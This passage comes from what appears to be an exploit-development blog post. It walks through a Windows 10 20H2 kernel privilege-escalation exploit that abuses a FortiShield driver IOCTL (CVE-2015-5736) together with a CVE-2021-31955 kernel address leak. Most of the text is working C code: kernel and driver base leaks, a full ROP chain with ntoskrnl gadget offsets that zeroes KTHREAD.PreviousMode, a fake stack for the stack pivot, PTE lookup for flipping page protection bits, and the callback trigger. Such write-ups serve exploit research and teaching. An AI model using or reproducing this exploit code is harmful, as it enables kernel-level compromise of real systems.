			<span class="n">baseAddr</span> <span class="o">=</span> <span class="n">searchAddr</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">searchAddr</span> <span class="o">=</span> <span class="n">searchAddr</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">baseAddr</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">ULONGLONG</span> <span class="nf">leakFortiBase</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">ntBase</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ULONGLONG</span> <span class="n">PsLoadModuleListAddr</span> <span class="o">=</span> <span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0xc2a310</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">searchAddr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">PsLoadModuleListAddr</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
	<span class="n">ULONGLONG</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">namePointer</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
		<span class="n">ULONGLONG</span> <span class="n">name</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">namePointer</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">name</span> <span class="o">==</span> <span class="mh">0x00740072006f0046</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">name</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">namePointer</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">name</span> <span class="o">==</span> <span class="mh">0x0069006800530069</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">addr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="n">searchAddr</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">searchAddr</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This chunk allocates the fake stack for the stack pivot and builds the ROP chain. This chain was written by Morten Schenk and Sickness. The chain is similar to the one for the POC on exploit-db but is tailored to work with Windows 10 20H2. We initially use a ROP gadget mov esp, 0xB60F0020 later in the code when we trigger the CVE-2015-5736 vulnerable IOCTL to pivot the stack to our ROP chain at the user-mode address we allocate in the allocate_fake_stack() function. We are able to use the gadget as the stack pivot because it moves a value into esp that can also be a valid user-mode address that we can allocate. That is why the ROP chain starts with allocating a user-mode address space that contains that address. The ROP chain sets the PreviousMode in our KTHREAD to 0 to enable us to use ReadProcessMemoryand NtWriteVirtualMemory as read and write primitives. As a reminder, this works due to a PreviousMode of zero tricking the kernel in to thinking the parameters passed to ReadProcessMemory and NtWriteVirtualMemory came from a kernel-mode call instead of a user-mode call. Thus it enables the read/write primitives because a call to ReadProcessMemory in a kernel-mode thread is allowed to read kernel-mode memory and a call to NtWriteWirtualMemory in a kernel-mode thread is allowed to write to kernel-mode memory. The ROP chain also restores the stack and registers to allow execution to continue instead of crashing after we have finished changeing PreviousMode with our hijacked callback to the ROP chain with the vulnerable CVE-2015-5736 IOCTL. This chunk also contains the get_pxe_address_64() function that will return the PTE for the supplied virtual address given the PTE start address we pull later in the code. This allows us to enumerate the PTE for a virtual address to flip bits such as the U/S or NX bits.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PULONGLONG</span> <span class="nf">allocate_fake_stack</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">ntBase</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">fortishield_callback</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">fortishield_restore</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">kThread</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">PULONGLONG</span> <span class="n">fake_stack</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x00000000B60E0000</span><span class="p">,</span> <span class="mh">0x14000</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fake_stack</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while allocating the fake stack: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">fake_stack</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x14000</span><span class="p">);</span>

	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3f01bf</span><span class="p">;</span>		<span class="c1">// pop rax ; pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">fortishield_callback</span><span class="p">;</span>		<span class="c1">// Callback address</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2dd014</span><span class="p">;</span>		<span class="c1">// mov qword [rax], rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3f01bf</span><span class="p">;</span>		<span class="c1">// pop rax ; pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">;</span>			<span class="c1">// KTHREAD.PreviousMode</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x49584f</span><span class="p">;</span>		<span class="c1">// mov byte [rax], cl ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2017d0</span><span class="p">;</span>		<span class="c1">// pop rbx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x00000000b60f0110</span><span class="p">;</span>					<span class="c1">// Location on fake_stack</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2017f2</span><span class="p">;</span>		<span class="c1">// pop rax ; ret;</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x217527</span><span class="p">;</span>		<span class="c1">// mov rax, rcx ; add rsp, 0x28 ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x3cd671</span><span class="p">;</span>		<span class="c1">// mov rcx, rsi ; call rax</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20de71</span><span class="p">;</span>		<span class="c1">// pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000028</span><span class="p">;</span>					<span class="c1">// Value to subtract to get RSP</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x029db2b</span><span class="p">;</span>		<span class="c1">// sub rax, rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x20de71</span><span class="p">;</span>		<span class="c1">// pop rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">fortishield_restore</span><span class="p">;</span>		<span class="c1">// Restore address</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2dd014</span><span class="p">;</span>		<span class="c1">// mov qword [rax], rcx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x2b82ce</span><span class="p">;</span>		<span class="c1">// mov qword [rbx], rax ; add rsp, 0x20 ; pop rbx ; ret</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xc8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xd0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xd8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// NULL</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>					<span class="c1">// Restore RBX</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10020</span> <span class="o">+</span> <span class="mh">0xe8</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0x201380</span><span class="p">;</span>		<span class="c1">// pop rsp ; ret</span>
	<span class="k">return</span> <span class="n">fake_stack</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">ULONGLONG</span> <span class="nf">get_pxe_address_64</span><span class="p">(</span><span class="n">ULONGLONG</span> <span class="n">address</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">pte_start</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ULONGLONG</span> <span class="n">result</span> <span class="o">=</span> <span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">9</span><span class="p">;</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">|</span> <span class="n">pte_start</span><span class="p">;</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pte_start</span> <span class="o">+</span> <span class="mh">0x0000007ffffffff8</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This is the walkEprocess() function I added to walk the EPROCESS address leaked from CVE-2021-31955 to return the KTHREAD. It takes a handle to the mdare driver to enable the leak of the QWORDs at various addresses and the EPROCESS address you wish to walk to find the KTHREAD.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONGLONG</span> <span class="nf">walkEprocess</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">driver</span><span class="p">,</span> <span class="n">ULONGLONG</span> <span class="n">eProcess</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">currentTid</span> <span class="o">=</span> <span class="n">GetCurrentThreadId</span><span class="p">();</span>

	<span class="n">ULONGLONG</span> <span class="n">listHead</span> <span class="o">=</span> <span class="n">eProcess</span> <span class="o">+</span> <span class="n">EPROCESS_ThreadListHead_Offset</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">flink</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">listHead</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>

	<span class="k">while</span> <span class="p">(</span><span class="n">flink</span> <span class="o">!=</span> <span class="n">listHead</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ULONGLONG</span> <span class="n">ethread</span> <span class="o">=</span> <span class="n">flink</span> <span class="o">-</span> <span class="n">ETHREAD_ThreadListEntry_Offset</span><span class="p">;</span>

		<span class="n">ULONGLONG</span> <span class="n">uniqueTid</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">ethread</span> <span class="o">+</span> <span class="n">ETHREAD_Cid_Offset</span> <span class="o">+</span> <span class="n">CLIENTID_UniqueThread_Offset</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">uniqueTid</span> <span class="o">==</span> <span class="n">currentTid</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ULONGLONG</span> <span class="n">kthread</span> <span class="o">=</span> <span class="n">ethread</span><span class="p">;</span>  <span class="c1">// Tcb is at offset 0x0</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Found current thread:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] ETHREAD: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ethread</span><span class="p">);</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] KTHREAD: 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kthread</span><span class="p">);</span>
			<span class="k">return</span> <span class="n">kthread</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">flink</span> <span class="o">=</span> <span class="n">leakQWORD</span><span class="p">(</span><span class="n">flink</span><span class="p">,</span> <span class="n">driver</span><span class="p">);</span>  <span class="c1">// Move to next thread</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Current thread not found in EPROCESS thread list.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The trigger_callback() function creates some files and then moves them which will trigger the callback we set with the CVE-2015-5736 IOCTL.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">trigger_callback</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Creating dummy file</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"echo test &gt; C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">n00b</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">LocalLow</span><span class="se">\\</span><span class="s">test.txt"</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Creating dummy file 2</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"echo test &gt; C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">n00b</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">LocalLow</span><span class="se">\\</span><span class="s">test3.txt"</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling MoveFileEx()</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

	<span class="n">BOOL</span> <span class="n">MFEresult</span> <span class="o">=</span> <span class="n">MoveFileEx</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">n00b</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">LocalLow</span><span class="se">\\</span><span class="s">test.txt"</span><span class="p">,</span> <span class="s">L"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">n00b</span><span class="se">\\</span><span class="s">AppData</span><span class="se">\\</span><span class="s">LocalLow</span><span class="se">\\</span><span class="s">test2.txt"</span><span class="p">,</span> <span class="n">MOVEFILE_REPLACE_EXISTING</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">MFEresult</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling MoveFileEx(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This chunk is the start of the main() function. It begins with opening handles to the  mdare and fortishield drivers.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>

	<span class="n">HANDLE</span> <span class="n">mdare</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">mdareDriver_48"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">mdare</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while creating a handle to the driver: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">HANDLE</span> <span class="n">forti</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">FortiShield"</span><span class="p">,</span> <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">forti</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while creating a handle to the driver: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
</code></pre></div></div>
<p>This chunk declares the eProcess variable, sets the name of the exploit to grab the EPROCESS of and passes it to GetEprocessAddress. It then pulls the KTHREAD with the walkEprocess() function and leaks the ntBase address with leakNtBase(). It then sets the stack pivot gadget address to the ntPivot variable and finds the start of the PTE address range by leaking nt!MiGetPteAddress+0x13 offset. We need the base start address of the PTE to find the PTE for our user-mode address space to flip the U/S bit. The PTE base address is randomized on bootup since Windows 10 1709, previous version used a static PTE base address making it easier to find. Windows still needs to know the PTE base address so after it is determined on boot up it is stored at nt!MiGetPteAddress+0x13. The PTE base address is found by doing
dqs or u nt!MiGetPteAddress+0x13 in the WinDbg. We then subtract the base address of nt from the address of nt!miGetPteAddress+0x13 to get the offset to use with the read primitive to retrieve the stored PTE base address.</p>

<p><img src="/assets/images/post2-windbg-migetpteaddress.png" alt="post2-windbg-migetpteaddress" /></p>

